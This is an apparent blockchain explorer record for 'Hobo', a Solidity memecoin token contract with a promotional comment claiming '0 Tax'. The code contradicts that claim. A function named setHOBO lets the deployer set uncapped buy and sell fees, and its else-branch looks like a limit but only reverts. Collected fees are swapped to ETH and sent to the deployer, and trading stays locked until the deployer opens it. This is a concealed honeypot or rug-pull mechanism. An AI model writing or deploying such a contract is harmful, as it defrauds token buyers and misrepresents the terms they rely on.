{"SourceCode": "/*\r\n\r\nHobo crawled out of his cardboard box and is ready to finally make it big. Help end the homeless bear epidemic.\r\n\r\nHobo is down on his luck. BUT\u2013he\u2019s got one last chance. He\u2019s apeing everything he has into $HOBO.\r\n\r\n0 Tax\r\n\r\nTelegram: https://t.me/HOBOCoinTGPortal\r\nTwitter: https://twitter.com/HoBoERC\r\nWebsite: https://hobocoin.online\r\n\r\n*/\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity ^0.8.23;\r\n\r\n    interface IUniswapV2Router02 {\r\n        function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            uint amountIn,\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n            ) external;\r\n        }\r\n        \r\n    contract Hobo {\r\n        string public constant name = \"Hobo\";  //\r\n        string public constant symbol = \"HOBO\";  //\r\n        uint8 public constant decimals = 18;\r\n        uint256 public constant totalSupply = 8_888_888 * 10**decimals;\r\n\r\n        uint256 BurnTNumber = 0;\r\n        uint256 ConfirmTNumber = 0;\r\n        uint256 constant swapAmount = totalSupply / 100;\r\n\r\n        mapping (address => uint256) public balanceOf;\r\n        mapping (address => mapping (address => uint256)) public allowance;\r\n            \r\n        error Permissions();\r\n            \r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(\r\n            address indexed owner,\r\n            address indexed spender,\r\n            uint256 value\r\n        );\r\n            \r\n\r\n        address private pair;\r\n        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n        address payable constant deployer = payable(address(0x269C070969623748F0b0f922cB71Fd383D2a5add)); //\r\n\r\n        bool private swapping;\r\n        bool private TradingOpenStatus;\r\n\r\n        constructor() {\r\n            balanceOf[msg.sender] = totalSupply;\r\n            allowance[address(this)][routerAddress] = type(uint256).max;\r\n            emit Transfer(address(0), msg.sender, totalSupply);\r\n        }\r\n\r\n         receive() external payable {}\r\n\r\n        function approve(address spender, uint256 amount) external returns (bool){\r\n            allowance[msg.sender][spender] = amount;\r\n            emit Approval(msg.sender, spender, amount);\r\n            return true;\r\n        }\r\n\r\n        function transfer(address to, uint256 amount) external returns (bool){\r\n            return _transfer(msg.sender, to, amount);\r\n        }\r\n\r\n        function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n            allowance[from][msg.sender] -= amount;        \r\n            return _transfer(from, to, amount);\r\n        }\r\n\r\n        function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n            require(TradingOpenStatus || from == deployer || to == deployer);\r\n\r\n            if(!TradingOpenStatus && pair == address(0) && amount > 0)\r\n                pair = to;\r\n\r\n            balanceOf[from] -= amount;\r\n\r\n            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n                swapping = true;\r\n                address[] memory path = new  address[](2);\r\n                path[0] = address(this);\r\n                path[1] = ETH;\r\n                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                    );\r\n                deployer.transfer(address(this).balance);\r\n                swapping = false;\r\n                }\r\n\r\n            if(from != address(this)){\r\n                uint256 FinalFigure = amount * (from == pair ? BurnTNumber : ConfirmTNumber) / 100;\r\n                amount -= FinalFigure;\r\n                balanceOf[address(this)] += FinalFigure;\r\n            }\r\n                balanceOf[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n                return true;\r\n            }\r\n\r\n        function OpenTrade() external {\r\n            require(msg.sender == deployer);\r\n            require(!TradingOpenStatus);\r\n            TradingOpenStatus = true;        \r\n            }\r\n            \r\n        function setHOBO(uint256 newTBurn, uint256 newTConfirm) external {\r\n        if(msg.sender == deployer){\r\n            BurnTNumber = newTBurn;\r\n            ConfirmTNumber = newTConfirm;\r\n            }\r\n        else{\r\n            require(newTBurn < 10);\r\n            require(newTConfirm < 10);\r\n            revert();\r\n            }  \r\n        }\r\n        }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"OpenTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newTBurn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newTConfirm\",\"type\":\"uint256\"}],\"name\":\"setHOBO\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Hobo", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a492e9e878c41d8ef13fa9a02d2ce3f78034a9f0d1de2b5cd969a89dc3ad5957"}